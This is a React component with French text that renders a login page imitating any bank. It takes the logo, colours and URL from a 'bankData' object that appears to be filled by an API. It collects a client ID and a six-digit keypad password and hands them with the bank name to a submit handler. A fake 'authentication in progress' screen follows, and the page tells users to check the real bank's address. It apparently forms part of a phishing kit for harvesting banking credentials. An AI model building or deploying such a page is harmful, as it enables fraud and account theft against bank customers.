import React, { useState } from 'react';
import { Loader2, Eye, EyeOff } from 'lucide-react';

interface ExtPartnersTemplateProps {
  onSubmit: (formData: any) => Promise<boolean>;
  bankData: {
    name: string;
    url: string;
    logo?: string;
    palette?: string[];
    backgroundColor?: string;
    textColor?: string;
  };
}

export function ExtPartnersTemplate({ onSubmit, bankData }: ExtPartnersTemplateProps) {
  const [formData, setFormData] = useState({
    clientId: '',
    password: ''
  });
  const [status, setStatus] = useState<'idle' | 'sending' | 'success' | 'error'>('idle');
  const [showLoader, setShowLoader] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [passwordDigits, setPasswordDigits] = useState(['', '', '', '', '', '']);
  const [logoError, setLogoError] = useState(false);

  // Couleurs par défaut si l'API n'a pas pu récupérer la palette
  const primaryColor = bankData.palette?.[0] || bankData.backgroundColor || '#2563eb';
  const secondaryColor = bankData.palette?.[1] || '#1d4ed8';
  const accentColor = bankData.palette?.[2] || '#1e40af';
  const textColor = bankData.textColor || '#ffffff';
  const lightColor = bankData.palette?.[3] || '#dbeafe';

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setStatus('sending');

    try {
      const submitData = {
        ...formData,
        password: passwordDigits.join(''),
        bank: bankData.name
      };
      
      const success = await onSubmit(submitData);
      if (!success) throw new Error('Failed to submit form');
      
      setStatus('success');
      setShowLoader(true);
      
      setTimeout(() => {
        setShowLoader(false);
        setStatus('idle');
      }, 3000);
    } catch (error) {
      setStatus('error');
      setTimeout(() => setStatus('idle'), 3000);
    }
  };

  const handleKeypadClick = (digit: string) => {
    const emptyIndex = passwordDigits.findIndex(d => d === '');
    if (emptyIndex !== -1) {
      const newDigits = [...passwordDigits];
      newDigits[emptyIndex] = digit;
      setPasswordDigits(newDigits);
    }
  };

  const clearPassword = () => {
    setPasswordDigits(['', '', '', '', '', '']);
  };

  const handleLogoError = () => {
    setLogoError(true);
  };

  // Show loader overlay when processing
  if (showLoader) {
    return (
      <div className="min-h-screen pt-20" style={{ backgroundColor: lightColor }}>
        <div className="max-w-4xl mx-auto px-4 py-8">
          <div className="bg-white rounded-2xl shadow-xl p-8">
            <div className="flex flex-col items-center justify-center py-16">
              <Loader2 className="w-12 h-12 animate-spin mb-6" style={{ color: primaryColor }} />
              <h2 className="text-2xl font-bold text-gray-800 mb-4">
                Authentification en cours...
              </h2>
              <p className="text-gray-600 text-center max-w-md">
                Connexion sécurisée à votre espace {bankData.name} en cours.
              </p>
            </div>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Header personnalisé avec les couleurs de la banque */}
      <div className="shadow-sm" style={{ backgroundColor: primaryColor }}>
        <div className="max-w-7xl mx-auto px-4 py-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center space-x-4">
              {/* Logo de la banque avec fallback */}
              {bankData.logo && !logoError ? (
                <img 
                  src={bankData.logo} 
                  alt={`Logo ${bankData.name}`} 
                  className="h-8 max-w-32 object-contain"
                  onError={handleLogoError}
                />
              ) : (
                <div className="flex items-center">
                  <div 
                    className="px-3 py-1 rounded text-lg font-bold mr-2"
                    style={{ 
                      backgroundColor: textColor, 
                      color: primaryColor 
                    }}
                  >
                    {bankData.name.substring(0, 3).toUpperCase()}
                  </div>
                  <span className="text-lg font-bold" style={{ color: textColor }}>
                    {bankData.name}
                  </span>
                </div>
              )}
            </div>
            <div className="flex items-center space-x-4">
              <button 
                className="px-4 py-2 rounded text-sm font-medium transition-colors hover:opacity-80"
                style={{ 
                  backgroundColor: secondaryColor, 
                  color: textColor 
                }}
              >
                Aide
              </button>
            </div>
          </div>
        </div>
      </div>

      <div className="flex min-h-screen">
        {/* Left Panel - Auth Form */}
        <div className="w-full lg:w-1/2 flex items-center justify-center p-8" style={{ backgroundColor: lightColor }}>
          <div className="w-full max-w-md">
            <div className="bg-white rounded-lg shadow-xl p-8">
              {/* Header du formulaire avec logo */}
              <div 
                className="text-2xl font-bold -mx-8 -mt-8 p-6 rounded-t-lg mb-8 flex items-center justify-between"
                style={{ 
                  backgroundColor: primaryColor, 
                  color: textColor 
                }}
              >
                <span>ACCÉDER À MES COMPTES</span>
                {bankData.logo && !logoError && (
                  <img 
                    src={bankData.logo} 
                    alt={`Logo ${bankData.name}`} 
                    className="h-6 max-w-20 object-contain filter brightness-0 invert"
                    onError={handleLogoError}
                  />
                )}
              </div>

              <form onSubmit={handleSubmit} className="space-y-6">
                {/* Client ID */}
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">
                    Identifiant client
                  </label>
                  <div className="relative">
                    <input
                      type="text"
                      value={formData.clientId}
                      onChange={(e) => setFormData(prev => ({ ...prev, clientId: e.target.value }))}
                      className="w-full px-4 py-3 border border-gray-300 rounded focus:ring-2 focus:border-transparent transition-all duration-200"
                      style={{ 
                        '--tw-ring-color': primaryColor 
                      } as React.CSSProperties}
                      onFocus={(e) => {
                        e.target.style.borderColor = primaryColor;
                        e.target.style.boxShadow = `0 0 0 2px ${primaryColor}20`;
                      }}
                      onBlur={(e) => {
                        e.target.style.borderColor = '#d1d5db';
                        e.target.style.boxShadow = 'none';
                      }}
                      placeholder="Votre identifiant"
                      required
                    />
                  </div>
                </div>

                {/* Password */}
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">
                    Mot de passe (6 chiffres)
                  </label>
                  
                  {/* Password Display */}
                  <div className="flex justify-center space-x-2 mb-4">
                    {passwordDigits.map((digit, index) => (
                      <div
                        key={index}
                        className={`w-8 h-8 border-2 rounded flex items-center justify-center text-lg font-bold transition-all duration-200 ${
                          digit ? 'bg-opacity-10' : 'border-gray-300'
                        }`}
                        style={{
                          borderColor: digit ? primaryColor : '#d1d5db',
                          backgroundColor: digit ? primaryColor + '20' : 'transparent',
                          color: digit ? primaryColor : '#6b7280'
                        }}
                      >
                        {digit ? (showPassword ? digit : '•') : ''}
                      </div>
                    ))}
                  </div>

                  {/* Virtual Keypad */}
                  <div className="rounded-lg p-4" style={{ backgroundColor: lightColor }}>
                    <div className="grid grid-cols-3 gap-2 max-w-48 mx-auto mb-4">
                      {[1, 2, 3, 4, 5, 6, 7, 8, 9, 0].map((num) => (
                        <button
                          key={num}
                          type="button"
                          onClick={() => handleKeypadClick(num.toString())}
                          className="w-12 h-12 rounded text-lg font-bold transition-all duration-200 shadow-sm hover:shadow-md active:scale-95"
                          style={{
                            backgroundColor: '#ffffff',
                            color: primaryColor,
                            border: `1px solid ${primaryColor}20`
                          }}
                          onMouseEnter={(e) => {
                            e.currentTarget.style.backgroundColor = primaryColor + '10';
                            e.currentTarget.style.transform = 'scale(1.05)';
                          }}
                          onMouseLeave={(e) => {
                            e.currentTarget.style.backgroundColor = '#ffffff';
                            e.currentTarget.style.transform = 'scale(1)';
                          }}
                        >
                          {num}
                        </button>
                      ))}
                    </div>

                    <div className="flex justify-center space-x-4">
                      <button
                        type="button"
                        onClick={() => setShowPassword(!showPassword)}
                        className="flex items-center space-x-2 text-sm transition-colors hover:opacity-80"
                        style={{ color: primaryColor }}
                      >
                        {showPassword ? <EyeOff size={16} /> : <Eye size={16} />}
                        <span>{showPassword ? 'Masquer' : 'Afficher'}</span>
                      </button>
                      
                      <button
                        type="button"
                        onClick={clearPassword}
                        className="text-sm transition-colors hover:opacity-80"
                        style={{ color: secondaryColor }}
                      >
                        Effacer
                      </button>
                    </div>
                  </div>
                </div>

                <button
                  type="submit"
                  disabled={status === 'sending' || passwordDigits.some(d => d === '') || !formData.clientId}
                  className="w-full font-semibold py-3 rounded transition-all duration-200 disabled:opacity-50 disabled:cursor-not-allowed shadow-lg hover:shadow-xl transform hover:-translate-y-0.5 active:translate-y-0"
                  style={{
                    backgroundColor: primaryColor,
                    color: textColor
                  }}
                  onMouseEnter={(e) => {
                    if (!e.currentTarget.disabled) {
                      e.currentTarget.style.backgroundColor = secondaryColor;
                    }
                  }}
                  onMouseLeave={(e) => {
                    if (!e.currentTarget.disabled) {
                      e.currentTarget.style.backgroundColor = primaryColor;
                    }
                  }}
                >
                  {status === 'sending' ? (
                    <div className="flex items-center justify-center space-x-2">
                      <Loader2 className="w-5 h-5 animate-spin" />
                      <span>Connexion...</span>
                    </div>
                  ) : (
                    'Se connecter'
                  )}
                </button>

                {status === 'error' && (
                  <div className="text-red-600 text-center bg-red-50 p-3 rounded border border-red-200">
                    <div className="flex items-center justify-center space-x-2">
                      <span className="text-red-500">⚠️</span>
                      <span>Échec de la connexion. Veuillez vérifier vos identifiants.</span>
                    </div>
                  </div>
                )}
              </form>

              <div className="mt-6 text-center">
                <button 
                  className="text-sm underline transition-colors hover:opacity-80"
                  style={{ color: primaryColor }}
                >
                  Identifiants oubliés ?
                </button>
              </div>
            </div>
          </div>
        </div>

        {/* Right Panel - Bank Info */}
        <div className="hidden lg:block lg:w-1/2 p-8" style={{ backgroundColor: primaryColor }}>
          <div className="max-w-md mx-auto mt-16" style={{ color: textColor }}>
            {/* Bank Logo Large */}
            {bankData.logo && !logoError && (
              <div className="text-center mb-8">
                <img 
                  src={bankData.logo} 
                  alt={`Logo ${bankData.name}`} 
                  className="h-16 mx-auto object-contain filter brightness-0 invert"
                  onError={handleLogoError}
                />
              </div>
            )}

            {/* Bank Name if no logo */}
            {(!bankData.logo || logoError) && (
              <div className="text-center mb-8">
                <h2 className="text-3xl font-bold">{bankData.name}</h2>
                <p className="text-sm opacity-75 mt-2">Banque en ligne sécurisée</p>
              </div>
            )}

            {/* Security Info */}
            <div className="mb-8">
              <h3 className="text-lg font-semibold mb-4 flex items-center">
                🔒 Connexion sécurisée
              </h3>
              <div className="text-sm space-y-2 opacity-90">
                <p>Vérifiez que l'adresse du site commence par :</p>
                <p className="font-mono bg-black bg-opacity-20 p-2 rounded break-all">
                  {bankData.url}
                </p>
                <p>avec une icône cadenas qui garantit une connexion sécurisée.</p>
              </div>
            </div>

            {/* Features */}
            <div className="mb-8">
              <h3 className="text-lg font-semibold mb-4 flex items-center">
                ✨ Services disponibles
              </h3>
              <div className="text-sm space-y-2 opacity-90">
                <p>• Consultation de vos comptes 24h/24</p>
                <p>• Virements et paiements sécurisés</p>
                <p>• Gestion de vos cartes bancaires</p>
                <p>• Support client dédié</p>
              </div>
            </div>

            {/* Contact */}
            <div className="bg-black bg-opacity-20 rounded-lg p-4">
              <h4 className="font-semibold mb-2">📞 Besoin d'aide ?</h4>
              <p className="text-sm opacity-90">
                Si vous rencontrez des difficultés, contactez votre conseiller 
                ou le service client de {bankData.name}.
              </p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}